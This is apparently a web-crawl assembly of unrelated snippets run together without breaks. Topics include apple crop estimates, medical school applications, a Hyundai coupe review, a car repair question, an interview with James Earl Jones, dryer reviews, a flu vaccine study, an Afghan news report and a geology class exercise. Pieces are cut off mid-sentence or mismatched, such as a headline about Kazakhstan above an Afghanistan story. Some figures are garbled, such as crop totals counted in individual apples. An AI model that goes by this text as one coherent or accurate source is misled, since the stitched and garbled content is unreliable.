Apple growers talk tree counts, not acreage, when it comes to measuring how large a crop will be. Mr. Allen explained that today growers put three times as many trees on an acre as they did years ago. And the tree count in New York State has increased considerably over the past decade.
The U.S. Department of Agriculture National Agricultural Statistics Service, commonly referred to as NASS, issues an apple tree survey every six years. One was done in 2006, and the most recent was 2012.
“The 2012 survey report indicated that we have a 24 percent increase over the previous six years,” said Mr. Allen. “But I say that it’s a very conservative number. There are many growers who do not respond to the survey because they prefer to not share that information, so it is quite common that the survey is not accurate. If anything, this is an underestimation. If every tree were counted, we would likely be up by 34 percent during the past six years.”
The 2012 New York State apple crop took a devastating blow due to inclement weather the previous spring resulting in the overall crop being down by over half of its normal volumes.
But Mr. Allen said that growers who would normally be busy in their storage and packingsheds didn’t take the down time to go on vacation. On the contrary, they were gearing up for what’s to come in the future.
“Growers and packers put their time to really good use this year,” he said. “A lot of packinghouses used the opportunity to do upgrades and renovations to their facilities. A number have added on to their infrastructure or added new equipment. There has also been a lot of new construction added over the past two years, and a couple of facilities are under construction now for new packing and new storage. And I have never seen so many new trees being planted as I have this spring — literally acre after acre of new density plantings for production that will being in three to four years down the road.”
Members of the New York state apple industry are open and welcoming to collaborate and work with other apple-producing states. They are all fully cognizant that by helping each other, they will be the entire industry grow into the future.
Mr. Allen noted that with Washington being by far the largest apple-producing state in the nation, the rest of the apple industry depends on it to increase its exports. That added demand will only help the domestic industry grow stronger.
Last year, Washington projected a crop of 130 million packed boxes would go to the fresh market. Some states measure their crops based on picked apples and others on packed apples. In Washington’s case, this means that the state produced between 150 million and 155 million total apples, with the difference having gone to processing.
“To offer a perspective on how large Washington’s crop is, New York’s total crop in a good year is 30 million picked apples,” said Mr. Allen. “Our predictions will be closer to target as we go through bloom and the June drop. By July we’ll have a good finger on sizing and all other details of what the crop numbers will actually be. If everything is normal, we’ll have a good full crop to get us through the season.”
Mr. Allen and his marketing colleagues spent the last week of April in New York City meeting with retailers and public relations firms. He said he was highly enthusiastic about how companies are asking for locally grown product today.
“We are very encouraged,” said Mr. Allen. “The locally grown emphasis continues to explode, and that means that our apples will have plenty of homes in our own state, as well as in the tri-state area and everywhere else we can reach in one to one-and-a-half days.”.

Good wrks my guy keep it up.Choosing where to apply to medical school is a critically important step in the application process, but it can also be a daunting and time-consuming task. Careful research and deliberation can help you meet this challenge and identify medical schools that would be a good fit for you.
According to the MSAR : Getting Started Medical School Admissions Requirements published by the AAMC, applicants applied to an average of 14 medical schools. Applying to more than 20 schools does not necessarily increase the chances for a successful application and completing more than 20 secondary applications can be overwhelming in time, effort expended, and financial costs. Many factors such as state residency and the number of medical schools in your home state and personal considerations will influence how many medical school applications you submit. Throughout this process you can consult with the prehealth advisor as you decide where to apply.
Below are some important resources to use and factors to consider as you begin to decide where you will apply to medical school.
In the MSAR the allopathic medical schools list their median and ranges of GPA and MCAT scores of accepted students, numbers of in-state and out-of-state residents interviewed and matriculated, demographic data on its student body, specific costs including tuition, fees, and other estimated expenses.
In the Osteopathic Medical College Information Booklet, there are national admissions statistics (GPAs and MCAT scores) as well as individual entries for each osteopathic medical college that describe admission criteria and specific costs.
If you are a permanent resident of a state, you should strongly consider applying to the state medical school(s) because they often try to accept more than 50% of their class from students who are from that state. You need to review the medical school admissions web sites to learn how each medical school determines state residency. Policies differ from school to school; sometimes medical schools require applicants to live in the state for a specific period of time to be considered official residents, even if the state considers the applicant to be a legal resident. Residents from states without medical schools may be able to apply to medical schools in other states that have contractual agreements with their home state.
According to the MSAR : Getting Started Medical School Admissions Requirements 2013 published by the AAMC, more than 50% of matriculants attend medical school in their home states.
Review the curriculum highlight section of the MSAR and individual school web sites. Is the curriculum format a traditional lecture approach? Problem-based learning format? What type of schedule (block classes or traditional multiple class format)? Accelerated basic science curriculum? What is the grading system? What is the level of emphasis on primary care versus research? Are medical school students required to do research or scholarly projects? Are there organized "learning communities" or formalized study groups? Are medical students assigned a specific academic or career advisor?
Medical schools have a wide variety of special academic programs as well as opportunities for learning about medicine outside of the traditional classroom. As you review the programs at medical schools think about your long-term career goals and the service activities that you have enjoyed in college. For example, look at the types of community service programs that the first year medical school students pursue. Does the medical school sponsor opportunities for international service or clinical rotations? Are medical students able to take courses in other graduate schools such as schools of business or public health?
The MSAR provides estimates for the first year medical school student budget including tuition and fees, books, living expenses, and insurance. Refer to othe Financing Professional School web page for more information on financing medical school and links to comprehensive resources provided by the AAMC about financial planning.
Throughout your career at Bryn Mawr you will have the opportunity to attend many seminars and programs led by physicians, many of whom are faculty members at medical schools. Often Bryn Mawr alumnae medical school students do programs on campus and are happy to answer questions about their medical schools. You should also try to participate in the externship program sponsored by the Career and Professional Development (CPD) Office that enables you to spend time one-on-one shadowing a physician who graduated from Bryn Mawr. Physicians and medical students can be great resources to help you explore individual medical schools and their training programs.
The AAMC has compiled questions that previous applicants wished that they had asked during medical school interviews. These questions can help you with your review of medical schools
Some international medical schools accept applications from U. S. citizens, and some schools actively recruit U.S. students. These medical schools have independent application procedures and admissions policies. Furthermore, only a limited number of international medical schools qualify for the U. S. Federal loan program, thus financing medical school abroad can be quite challenging. If you are considering applying to international medical schools, you should discuss this option with the prehealth advisor.Information Technology 27 sh404SEF custom content 1 Do not delete please!

I laughed and said, "but Art is coming down in two weeks. Couldn't he have brought it down with him?" Art and Sheri are friends, so it's not a surprise that he sends her things, or drops by and says hi. It's just funny to Sheri and me that he's sends things even when he knows he's coming down. Why not save the money and drop it off? "It's the main reason we got divorced, he's frivolous with his money, and I am sensible".
Las Vegas is feeling the pain of this recession. As I drive to my hotel I notice that the casinos are empty. As I walk through the casino to the bowling alley to meet some friends I notice the lack of people at the restaurants and the slot machines. They are conspicuous by their absence. So is their money.
It makes sense that wherever there was a housing boom going on, that is where the economy is roughing it. In Las Vegas there was a boom in commercial buildings and in housing- a double whammy. The city has been decimated financially.
As my buddy Warren and I sat at a table watching families bowl we talked about how many of them would buy a Hyundai. We agreed that many of them would buy a Hyundai, assuming that they had to buy a car. Anecdotal evidence says that very few people are buying cars these days that don't absolutely need them. But why would so many of the people bowling buy a Hyundai?
Hyundai has an assurance program that gives the buyer confidence to buy a car, even in the face of a possible job loss. Most people are anxious about losing their job, and for good reason. "This is a once every century dislocation in the marketplace" said John Krafcik, President and CEO, Hyundai. Even people who are pretty sure they won't lose their job are scared.
Hyundai isn't comfortable when they are told their cars were cheap. They don't mind affordable with a good warranty, but cheap means poorly built. Nowadays, people are looking for inexpensive, but Hyundai would prefer the word sensible.
John Krafcik, President and CEO, Hyundai America, is glad to have a coupe in the Hyundai line-up, because coupe sales are up. Krafcik made the point that it wasn't because a whole slew of people all of a sudden decided they wanted to buy a coupe. There are more coupes on the market to choose from, coupes that incorporate the performance of a sports car and the ability to carry a family.
The next morning Warren and I took a drive through the desert in the 2010 Hyundai Genesis coupe. We drove the 3.8-liter out to Pahrump's race track. I was wearing my pink Piloti racing shoes, but I'm not big on the track. What I thought was really cool were the guys doing the drifting. Stephan Verdier is a drifter and took me around the cones.
I told Verdier I didn't get drifting, what was the big deal? Verdier told me to think of drifting like figure skating in a car. It is an art form that requires precision. Verdier turned the car on a dime, and could slide the car up to a person within the hair on their chinny-chin-chin.
What I did like about the Hyundai Genesis was the feel of the car on the desert roads of Nevada. That knock-me back in my seat feel, the agileness of a car that is inches shorter than the sedan that has the same engine. A sports car that takes regular gasoline and will give more horsepower (375hp instead of 368) if you use premium 91 octane.
The Genesis coupe is well positioned for the young buyer, including Ipod and Iphone connectivity. Not only can you use the technology, they will be charged while hooked up to the car. An Infinity audio system is optional.
Pricing has not been announced, but expect Hyundai to price it sensibly.

As I was drving my car it turned off and as it did that thr rpm went up to 1000 rpm to 2000 rpm and then it shut off. I was driving at a speed of 25mph and after I let go of the accelerator that happened and it shut off. Car wont start now. I scaned it and got a p0340 code. I already changed the crankshaft and camshaft position senors. I also checked the wiring. Could it be the pcm. I also changed that but I baught the pcm at a junkyard but it still wouldnt start. Does the pcm have to match the same as the old one? It seems like its not passing gas or its not igniting. Please help.

Naithan Jones
A Kansas City-area startup looking to create a more direct link in the food chain between meat lovers and their products has raised more than $1 million in seed financing.
AgLocal LLC’s investors included Kansas City-based private equity firm OpenAir Equity Partners.
Fairway-based AgLocal plans to use the money to build out its technology platform, increase partnerships with meat farmers and potentially hire out-of-state engineers, CEO Naithan Jones said.
AgLocal aims to connect health-conscious or locally minded meat-eaters directly to local farms through a Web application the seven-employee Fairway company is developing.
The application, which comes complete with a farm-rating system, allows carnivores to search the national farm network by cut of meat and geographic location. It’s intended to help consumers bypass grocery stores and order meat from the farms on the AgLocal site.
As of March, the company had 62 farms in its network. On Monday, a company spokeswoman said the network had grown to more than 100 participating farms.
She said that AgLocal has not determined how many engineers it needed but that those hires probably would take place in California.
In March, AgLocal helped generate investor interest with a pitch at the SXSW Accelerator, a contest tied to Austin’s South by Southwest music festival.NEW YORK (AP) — Miguel Cabrera homered against the Yankees again and had three hits while playing on a bandaged leg and Torii Hunter connected and drove in four runs Saturday, leading the Detroit Tigers over New York 9-3.

The Regulative Principle and Exculsive A Cappella Psalm Singing as a Requirement for Worship.

The Regulative Principle, 2001
Labels: Psalm Singing, Regulative Principle, RPCNA
Hi Kathy
The document that you have linked to in this post has been deleted. ?
Hi,
I'm not sure why you're asking these questions but I'll bite. It's the principle that scripture regulates our worship practice in the same way that it regulates our theology. Hence, just as we may not invent new doctrines, we also may not invent new worship practices. This is an implication of sola scriptura and yes, it comes from the bible. Regarding how it relates to psalm singing, while there are clear scriptural commands to sing the psalms, there are no clear commands to sing uninspired songs. I hope this is helpful.

Hi David R.
She's asking those questions, because she answers them in her linked paper. However, when I click on the link to Scribd, I see a message that the paper has been deleted. I think it would be great if you could read her paper and interact with it.
Hi David,
Thanks for alerting me to the broken link on my blog. My apologies. I'm not very tech savvy.
The link is fixed now so if you'd like to take a look at my research on what the Bible says about the Regulative Principle, I'd love to hear your response.
Very good read, reflecting many thoughts I have often had as a life long RP.......
your mention of Luke 18, on page 13, makes me think directly of the talk given at horn creek 2009......sadly.
-Junker
Thanks so much for taking a look at the article, Junker. Jesus' telling of the publican & the Pharisee is indeed a very sobering reminder of how easy it is to lapse into the Pharisee's attitude for those of us who have long been churched. We all need to pray for the humble spirit of the publican.Train cases/Makeup cases
A visit to the nearest cosmetics store or an online makeup store provides a number of products for storing makeup. One of them is a train case, or makeup case. These containers have sections for small cosmetics like eyeshadows, as well as larger products, like foundations or skin care products. One major brand that provides these solutions is Caboodles, but there are many others.
Palettes
Another option is to buy palettes to store cosmetics. Some cosmetics companies, like MAC, sell palettes with a magnetized base. You can purchase products designed for storage in palettes. They come stored in metal trays so they will stick to the magnetized palette.
You may also choose to de-pot cosmetics you already own, then store them in the palette. Note that this doesn't work well with some baked eyeshadows, powders and blushes that don't come stored in a metal tray. Be careful when de-potting products.
Other Containers You May Not Have Considered
A visit to your local art supply store or craft store can reveal some surprising storage options.
- Plastic storage drawers
- Scrapbooking carts hobby bins
- Modular storage bins
- Containers used for storing beads or sewing supplies
If you're fed up with your disorganized makeup drawer, you're not alone. But the good news is that there are plenty of products and techniques you can use to organize your makeup and other cosmetics. Whether you use a train case, palettes, or plastic containers from the craft supply store, you'll free up some space and save time normally spent looking for your favorite products..

What made you start your own business?
I wanted to do something different to the office jobs that I had been used to, that was also related to something I was interested in and passionate about, as well as fitting in with and around family life. My third son has been in cloth nappies since he was a couple of weeks old, and it’s safe to say that it’s become a bit of an addiction, so it seemed like the obvious choice, and so Fluffy Bum Boutique was born.

If your the festival goer who prefers a bit more glam then this glamping look is for you with a pastel maxi skirt, some metallic gladiators and tasselled lace people won't believe you've spent the night in a sweaty tent.

Sara,You'd think the voice behind the galaxy's worst dad would be a little biased when it comes to playing favorites in 'Star Wars.' When Moviefone caught up with James Earl Jones to hear his thoughts on the upcoming 'Star Wars: The Complete Saga' Blu-ray release, however, the acclaimed actor revealed that Darth Vader wasn't Darth Vader's favorite character.
"Chewbacca is my favorite," Jones said by phone to great nods of approval in Moviefone HQ. Read on to find out why Jones thinks Darth Vader has remained such a powerful presence during the last four decades, how his Governors Award acceptance speech is coming along, and what it's like having 'Dr. Strangelove' as his first starring role.
Why do you think the voice of Darth Vader has remained so powerful over the course of 30 years?
Well, a hidden voice, a hidden face creates a lot of mystery. It leaves everything up to the audience's imagination.
I had an unusual experience not too long ago. There was a lady from Finland, a doctor, who had a theater in Washington, D.C. where she put masks on young, impaired children. And there was a narrator, so all the kids had to do was come out and face each other, make certain gestures, and these faces were the only things you would look at. You weren't bothered by their impairment, so it freed your imagination as to who's talking behind that mask. The same thing happens with Darth Vader.
Besides it being scary, perhaps, you're also freed from having to be impressed by what he looks like. Your imagination can go wild.
So is Darth Vader your favorite 'Star Wars' character?
Chewbacca is my favorite.
What a great choice! My co-workers are all nodding their heads in approval.
[Laughs] Oh, really?
So are you excited or nervous for your Governors Award at this year's Oscars?
My wife and I have not stopped cheering with joy yet, so we haven't really had the chance to be nervous. And I also say that the award goes to the whole village because they've done as much for it as I have.
I think you're selling yourself a bit short there.
Well I'm very proud of it.
How's the acceptance speech coming along?
Oh, I hope to say very little. [laughs]
Alright, one more question. What's it like having 'Dr. Strangelove' as your big-screen debut?
Well I think what made it a cult hit was the universities, young people on college campuses, because the military didn't like that movie. It was too much of a put-down and the population was very pro-military then, so nobody said, "Oh, that's my favorite movie." But the young kids did and this was before counter-culture, too.
When your humor has to come out of a dignified officer shooting a Coke machine, I was like, "Come on, are we back in 'Animal House?'" I didn't know whether I wanted to take that seriously or not, but that's a kind of humor that [screenwriter] Terry Southern was into back then. I worked with him on something else later, but I wasn't really sure if I recommended that as a level of sense of humor.
But it wasn't a sense of humor, I guess, it was something else -- a sense of irony, a sense of cynicism, and all that we needed to replace the worship of war. And we still need it, I guess.
So who's the better 'Star Wars' character: Vader or Chewie?

While the place was rather quiet when we first arrived, but it filled up to capacity by the end of our meal. We were seated in a cute little booth, in clear view of a TV showing hockey and surrounded by pictures of sushi and special dishes. I know it may be tacky, but I love seeing these pictures! It helps me choose, which is important when the regular menu had over 120 different items to pick from!
Chris & I both chose from their “Happy Hour After 8:00 PM” menu where everything was 40% off the regular price. Our go-to meal is tempura udon (ideally with the tempura on the side). Not wanting to break tradition, I chose this again, and was quite happy with the dark broth and chewy noodles of the udon, and the decent portion of tempura (including 2 prawn, and 3 or 4 other veggie pieces). While some places reduce the size of your soup dish during “happy hour” Kishu’s serving size was very large, probably the same as what they normally serve – the price ($4.50) was pretty fantastic!
Chris chose something a little different – he went with the Tempura Soba. The soba broth was much stronger than the udon broth, and the noodles were cooked pretty well.
Since this was dinner, we also ordered some rolls to share: an Unagi Roll and Crunchy Roll (salmon tempura inside a roll with a bit of mayo, topped with more tempura bits)
These rolls were not on special, so for the price, they were a little underwhelming. I didn’t care for the salmon tempura one at all – it was too dense and heavy to work as a maki. The unagi and avocado were well combined in the Unagi Roll,, and generally, both were good, and quite filling, given the amount of rice included. I suppose the only other down-side was that the nori had become a little chewy, but that may again be because of the rice.
Chris was still hungry after this – he had skipped lunch (I don’t know how he can do that! I’d pass out!) so he ordered a few cones. Several of their cones were on special, which made this add-on very reasonable. The California Cone looked very well executed, with the big piece of avocado and generous serving of “crab”. The BC Cone was also well-stuffed and sauced. On both these servings, Chris noted that the nori was much better – so clearly it was the overabundance of rice that was to blame on the regular maki.
All in – this dinner cost us just around $26. Pretty great given how much food we got! The service was good and fast.

(credit: Thinkstock)
For more news and

Let's Get To Work
Sacramento.
Rachael Twiner, RMA, CCMA is a program director of medical assisting at Carrington College. From being an RN in the UK to teaching medical assisting students in Sacramento, her journey has given her a unique perspective on education and health care.
What is the importance of re-education in your field?
“The medical assisting field is ever-evolving with technological advances and new discoveries in diagnosis, patient care and administration, which requires health care professionals to continue their education and training in order to stay at the forefront of new developments. Medical assisting is expected to grow by more than 30 percent during the next few years, and with the new implications of the Affordable Care Act, the demand for health care and social assistance sector jobs is growing faster than any other field.”
What is your advice to someone considering entering this field of work?
“This is an exciting field at an exciting time. Medical care is at the forefront of many peoples’ thoughts and the simple fact is we all get sick or require medical treatment at one time or another. There are real career paths that can be opened up by becoming a medical assistant, some examples include nursing, office manager or teaching courses later in your career. The exposure to new tasks and interactions is a daily occurrence – it’s not a boring job!!”
How has your degree helped you personally and professionally?
“My degree helped open new doors when I moved to Sacramento from the UK. I was a registered nurse in the UK, but was unable to work when we first arrived in the US. This respite from employment allowed me to reevaluate my career and I decided to start teaching medical assisting courses at Carrington College, something that I truly enjoy every day. Without my degree, that door would not have been ajar.”
What is your advice to those looking to enter your field of work?
“Jump in. A career in health care is very rewarding, from the interesting tasks that are performed every day to the patient/doctor interaction. As a medical assistant, you know you’re making a difference – and who knows how many doors could open from taking that first step.”.You may have a less severe response to allergens as you get older. — MECKY."

supplemental draft - any interest
Is there anyone in the supplemental draft that might interest the Rams, the only one I can think of might be the LB from UVA Ahmad Brooks. He could be a strong or inside LB and could be had in the 3rd, maybe the 4th.
Re: supplemental draft - any interest
Sorry, whats the supplemental draft?
Re: supplemental draft - any interest
I like Ahmad Brooks also. I'd take him in the 4th Round and then trade Travis Fisher for a 4th Rounder
Re: supplemental draft - any interest
I'd give a third for Ahmad Brooks. He would really improve our LB corps.
Re: supplemental draft - any interest
I was a huge Ahmad Brooks fan a year or so ago, but I wouldn't spend more than a fifth on him now.

I've read a few "inside" reports on him that question his work ethic, intelligence, and overall attitude [to add to his reported problems with Al Groh & staff at Virginia], so those are the only things that would hold me back from giving up any higher draft picks for him.

With the Supplemental Draft approaching in July, would anyone roll the dice on this troubled but talented MLB? From what I've read he could be the second coming of Ray Lewis.

[NFL] Supplemental Draft
In late summer, the NFL also holds a Supplemental Draft to accommodate players who did not enter the regular draft because they thought they still had academic eligibility to play college football. The supplemental draft maintains the same team order from the regular draft, with the team with the worst record in the previous season picking first.
However,, University of Miami earned his academic degree a year early but did not enter the regular draft that year. Rather than finish his eligibility at Miami, he entered into talks with his hometown Cleveland Browns, who advised him to delay his professional eligibility until after the regular draft. They then traded for the right to choose first in the Supplemental Draft. This angered many clubs, notably the Minnesota Vikings and New York Giants, who had expressed interest in choosing him in that season's regular draft. Many of today's Supplemental Draft rules aim at preventing a reoccurrence of this incident.
As of 2006, players who enter the Supplemental Draft usually are graded as players who should be drafted at a later round, or who have college eligibility problems (poor academic or discipline issues). Only 32 players have been taken in the past 26 Supplemental Drafts.
BookmarksA group of 51 retired senior foreign affairs professionals including 37 former ambassadors recently wrote a letter to the Secretary of State urging that “a career foreign affairs professional be appointed as the next Under Secretary of State for Public Diplomacy and Public Affairs.” Below is an excerpt from the letter. The full text of the letter is at the end of this post:
A career foreign affairs professional, with years of overseas and Washington experience, is more likely to understand the larger world context and how public diplomacy can help achieve America’s policy goals.
[…].
Tara Sonenshine, the incumbent of what is known as the “R” bureau was appointed on April 5, 2012 and reported to be leaving post early this summer. This position was created on October 1, 1999 after the abolishment of the United States Information Agency. The Under Secretary oversees three bureaus at the Department of State: Educational and Cultural Affairs, Public Affairs, and International Information Programs.
Matt Armstrong’s Mountainrunner posted a backgrounder on this position: R we there yet? A look at the Under Secretary for Public Diplomacy (and Public Affairs) in January 2012.
No career diplomat has ever been appointed to this position (via history.state.gov):
--)
The ambassadors’ letter and the reportedly forthcoming “scathing” OIG report on the IIP Bureau might just be the nudge to move this bureau under a career professional. But that remains to be seen.
If you haven’t read that OIG report, that’s because it has apparently been floating around for months but has yet to be released to the public. Somebody got tired of waiting, of course, and leaked a portion of it to WaPo’s Al Kamen:
.”
Below is the text of the letter sent to Secretary Kerry. The signatories include John R. Beyrle, Director, U.S. Russia Foundation, and former Ambassador to Russia and Bulgaria; Barbara K. Bodine, former Ambassador to Yemen; Edward Brynn, former Ambassador to Burkina Faso and Ghana, and Acting Historian of the Department of State; Brian Carlson, former Ambassador to Latvia and Public Affairs Officer (PAO) in Spain, Norway, and Bulgaria; John Campbell, Ambassador (Retired), Ralph Bunche Senior Fellow for Africa Policy Studies, Council on Foreign Relations; Walter L. Cutler, former Ambassador to Saudi Arabia, Tunisia, and Zaire; John Evans, former Ambassador to Armenia; Linda Jewell, former Ambassador to Ecuador; Robert Finn, former Ambassador to Afghanistan and Tajikistan.
It also includes Richard LeBaron, former Ambassador to Kuwait and Founding Coordinator of the Center for Strategic Counterterrorism Communications and Thomas R. Pickering, former Ambassador to Nigeria, Jordan, El Salvador, Israel, the United Nations, India, and Russia, and Under Secretary of State for Political Affairs. Full text below:
We urge that a career foreign affairs professional be appointed as the next Under Secretary of State for Public Diplomacy and Public Affairs. Such an appointment would support your efforts fully to integrate public diplomacy into U.S. foreign affairs.
No career professional has served as Under Secretary for Public Diplomacy and Public Affairs. Coincidentally or not, today there is a wide consensus that U.S. perspectives are less well understood abroad, and people-to-people exchanges are less robust than they should be. In today’s globalizing but still threatening world, and as our military forces abroad are drawn down, it is more important than ever that America strengthen its “soft power.” For this, public diplomacy is an essential and powerful tool.
A career foreign affairs professional, with years of overseas and Washington experience, is more likely to understand the larger world context and how public diplomacy can help achieve America’s policy goals. And it is challenging to direct and energize public diplomacy if the leadership has brief tours or vacancies are lengthy. Prior to the incumbent Under Secretary for Public Diplomacy and Public Affairs, leaving after just over a year in office, the previous four served, on average, nearly two years. By comparison, the previous four Under Secretaries for Political Affairs, all career professionals, served, on average, nearly three-and-one-half years. The U.S. Advisory Commission on Public Diplomacy reports that the position of Under Secretary for Public Diplomacy and Public Affairs has been vacant more than 30% of the time since it was created in 1999. The position of Under Secretary for Political Affairs has been vacant only 5% of that time.
Studies by the Defense Science Board, RAND, and other independent groups have found that America’s engagement with foreign publics succeeds best when led by experienced officials having the authority to establish priorities, assign responsibilities, transfer funds, and concur in senior appointments. Leaders must have direct access to you and the President on critical communication issues as policies are formulated and implemented.
When done well, public diplomacy works. Large numbers of foreign heads of government, legislators, and social, economic, and political leaders — many of them America’s staunch allies and stalwart friends — have participated in U.S. public diplomacy programs. The University of Southern California recently reported that of individuals exposed to U.S. public diplomacy, 79 percent have used what they learned to bring about positive change in their own communities by running for political office, organizing a civil society group, doing volunteer work, and starting a new business or other projects.

Energy and water efficient washing machines have redefined our concept of them. Large agitators are gone, beepers, lights and motor turning on and off dozens of times are now the norm with washing machines. We found it difficult to see so little water washing our clothes in the "normal" setting. So to compensate, we now choose the "bulky" setting or the "handwash" setting for most everything. Using concentrated liquid detergent, its very difficult to know how much water will be used during the prewash and then wash cycle. The machine motor turns on and off repeatedly. I don't expect it to last at this rate but a few years, if that. Water level in the machine is counter-intuitive. It usually wants to use very little water. In the normal cycle, the water is not to be seen. The clothes just swish around like wet dishclothes. But none of this is meant to say we are disappointed in the Bravo series washer. It exudes quality, from its stainless steel drum to its glass lid and metallic finish. Its the era we have to adjust to, not the machine's fault.

Very efficient and I love the dry senser. I Highly recommend this dryer.
This is a good quality product.

For the most part I am very pleased with this dryer. I think I still need to learn more about the settings. Sometimes the items are not as dry as I would like. It is a large drum but a little low so if you have problems bending or are short, reaching all the way to the back may be a problem. It is quiet and I do like the variety of settings. Have been pleased with drying things I don't want to shrink. Also, like that it will keep tumbling to prevent wrinkling if I am busy and can't get there when it is done.
This is a rockin' dryer!

I love this Maytag dryer. I've always been a huge Maytag fan and this dryer only confirms why. I am drying clothes in it that I would have NEVER used in my older, non-Maytag dryer. They come out perfectly dry, few or no wrinkles, and no shrinkage. What more can you want?

Sensor dry works well. When I had a mixed load with my old non Maytag dryer it usually shut off before the heavier items were dry. I have found the wrinkle prevention to work very well. I was concerned that the powder coat interior would not hold up, but so far drying jeans has not scratched the interior. I paid much more for my old dryer because the interior was not painted.
Great dryer!!

With past dryers, my clothes would come out very very hot, and they seemed to lose a certain something in the drying process. But with this dryer, I have had no problems with my clothes becoming too hot, no shrinking problems, and my clothes look fresh and feel great when they come out. I am able to adjust the dryer's heat to match my laundry's needs, and it "senses" when they are dry so that they only get as hot as absolutely needed.
Great Dryer

This has been a great dryer. Does not over dry clothes like older ones and senses the humidity to make sure clothes do not get burned or end up with shrunken shirts.

March 7, 2013 -- A new study conducted by researchers from Vanderbilt University Medical Center in collaboration with CDC has found that flu vaccination reduced the risk of flu-related hospitalization by 71.4% among adults of all ages and by 76.8% in study participants 50 years of age and older during the 2011-2012 flu season.
“This study is reassuring in light of recent reports that flu vaccination can be less effective in older adults,” said Dr. Keipp Talbot, lead author of the study and a Vanderbilt medical researcher.
The study, entitled “Effectiveness of influenza vaccine for preventing laboratory-confirmed influenza hospitalizations in adults, 2011-2012 influenza season,” was published online in the journal Clinical Infectious Diseases on February 28, 2013. It is available for online viewing or download.
It’s estimated that more than 200,000 people in the United States are hospitalized each year from flu-related illness. Older adults, specifically those 65 years of age and older, typically account for 60% of these flu-related hospitalizations each year and about 90% of flu-related deaths.
“This study shows that the flu vaccine can offer significant protection against serious illness resulting in hospitalization for adults of all ages,” said Talbot.
“Studies such as this one are very important because they help us better understand the benefits of flu vaccine, particularly in older adults,” said Dr. Mark Thompson, a CDC flu expert and a co-author of the study. “Although flu vaccination can vary in how well it works, it’s still the best tool we have against the flu, and this study shows just how important the flu vaccine can be in preventing severe illness in older adults.”
According to the study’s authors, the results of the study also provide additional evidence for increasing vaccination rates in adults 50 years of age and older. “Given current flu vaccination rates in older adults, we think that increasing flu vaccination rates in this age group could prevent more than one-third of the total flu-related hospitalizations that occur each year in the United States,” said Dr. Talbot.
With few exceptions, CDC and the Advisory Committee for Immunization Practices (ACIP) recommend yearly flu vaccination for all people 6 months of age and older in the United States. A yearly flu vaccination is the first and most important step in protecting against flu viruses. In addition to vaccination, CDC recommends that older adults seek medical treatment right away if they do develop flu like symptoms, regardless of whether or not they have been vaccinated against the flu.
“Older adults often delay seeking medical treatment, but this can lead to complications that can become serious,” said Dr. Thompson. “People often aren’t aware that there are drugs called “antivirals” that can treat the flu if you do become sick with the flu.”
Antiviral drugs are prescription medications that can shorten the time of illness and lessen symptoms, but they work best when started as soon as possible after symptoms develop.
In addition to vaccination and seeking early medical treatment when sick, CDC also reminds everyone to take everyday preventative actions to reduce the risk of getting sick from the flu or spreading it to others. Examples of everyday preventive actions include: staying away from others who are or may be sick, staying home when you are sick (except to seek medical care), covering coughs and sneezes with a tissue, and washing your hands with soap and water frequently.

Can Kazakhstan become a world power?
10 Sep 2005 17:49 GMT
Defence Minister Abdul Rahim Wardak had just left Kabul airport at 9.25am (0455 GMT) in a helicopter when his car was fired on by four men in combat uniform, ministry spokesman General Mohammed Zahir Azimi said.
The minister was unhurt.
Nine suspects, all Afghan soldiers, were arrested in connection with the shooting, Azimi said.
"It is clear that it was an assassination attempt on the defence minister," he said.
He added that four bullets hit the convoy as it was driving out of the airport, one of them "hitting the exact place where the defence minister had been sitting in the car".
A senior government official speaking on condition of anonymity, said the armed men were Afghan army soldiers angered by a pay dispute.
Helicopter crash
Hours later, a helicopter crashed at Wardak's destination in the Panjshir Valley north of Kabul, where senior officials were attending a ceremony commemorating the assassination of anti-Taliban leader Ahmed Shah Massood four years ago.
Army chief Bismillah Khan and Sediqa Balkhi, minister for the disabled, were slightly injured in the crash, according to presidential spokesman Karim Rahimi.
The Taliban are opposed to elections in AfghanistanDefence ministry spokesman Azimi said Wardak was not on board the aircraft that crashed. His helicopter returned to Kabul without incident.
The Taliban are opposed to elections in Afghanistan
He denied reports that it had been fired on and said it crashed when its rotor blades hit a tree, shortly before noon.
"While an Afghan helicopter was landing in Panjshir, its rotor blade touched a tree and the helicopter fell to one side. Since it was very close to the ground no one was wounded or killed," Azimi said.
"It was definitely an accident," he added.
However, presidential spokesman Rahimi said the helicopter was taking off when it crashed.
"The chopper crashed while taking off. Bismillah Khan and the minister for the disabled were on board. According to initial reports one of the pilots and the ministers have been slightly injured," he said.
Fighters killed
Meanwhile, Afghan and US-led forces killed 30 suspected fighters and arrested at least 60 others during an offensive in a southern province, the Defence Ministry's Azimi said on Saturday.
The fighting took place on Friday in the Grishk district of the southern Helmand province, Azimi said.
He said "a large number" of suspected fighters were arrested and that 60 of them had been identified.
Afghan soldiers were collecting weapons in the area, including some that were lying in farms.
"We have seized lots of ammunition and weapons," Azimi said.
The offensive is the latest large-scale operation against Taliban fighters in volatile southern and eastern Afghanistan.

Cleveland is no exception. At Carol and John's Comic Book Shop they are ready to pass out 20,000 free comics. Last year 2,000 people came through the shop in one day.
The fun starts early with a midnight release party. Comic fans dress in costume can enjoy a special brewed beer for the occasion.
"We have 20 different sketch artists coming out to do sketches for The Hero Initiative, which is a charity organization for older comic creators that can't support themselves anymore," says John Dudas, Owner of Carol & John's Comic Book Shop.
All the fun has a purpose.
"To bring new people into the comic book shop," Dudas continues. "To bring people back into the comic book shop that have lapsed in their collecting and to reward regular collectors something very unique and a gift for them."
With movies like "Iron Man 3" and "The Man of Steel," pop culture has hit the mainstream.
"These are being created by people who loved comics when they were kids, so these people are dictating culture, they are producing it," Dudas explains.
51 different comic books were created for the day.
"That sense of community around the hobby is actually what the weekend is about and that's what they are excited about," Dudas says. "It's a whole great weekend for us kind of people."

WKYC-TVBuilding a Facies
The purpose of this exercise is to help students understand a model by "building" it "piece by piece" and relating the various components to concepts they learned earlier in the semester, such as energy relationships, base level, facies, facies associations, and Walther's Law. It is designed to begin as an in-class discussion led by the instructor using a black or white board, followed by group collaboration, out-of-class exercises, and concluding with a formal examination.
The example provided here is for a prograding shoreface system; however, the same approach can be applied to any depositional system.

Students form groups of three to four to compare their work and make modifications to their individual models.
Students compare their models to published versions and to try to understand and explain differences. Part of this is to emphasize that there is a range of correct interpretations and to not become locked into thinking there is a single solution.The assignment requires a written report at the end of each facies model, demonstrating how they would explain the model to another geologist.
Description and Teaching Materials
